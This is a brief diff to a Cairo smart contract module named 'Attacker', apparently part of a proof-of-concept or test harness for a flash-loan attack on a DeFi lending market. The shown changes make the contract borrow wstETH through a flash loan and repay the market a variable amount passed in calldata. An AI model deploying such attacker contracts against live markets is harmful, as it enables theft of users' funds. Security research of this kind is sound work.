@@ -52,7 +52,7 @@ pub mod Attacker {
             let market_address: ContractAddress = contract_address_const::<market_address_felt>();
             let market = IMarketDispatcher { contract_address: market_address };
 
-            let calldata = array![1];
+            let calldata = array![amount];
 
             let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
             market.flash_loan(get_contract_address(), erc20_address, 1, calldata.span());
@@ -65,7 +65,11 @@ pub mod Attacker {
             let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
             let erc20 = IERC20Dispatcher { contract_address: erc20_address };
 
-            erc20.transfer(market_address, 1000);
+            let cd_1: felt252 = *calldata.at(0);
+            let amount = cd_1.into();
+            println!("Amount {}", amount);
+
+            erc20.transfer(market_address, amount);
         }
     }
 }
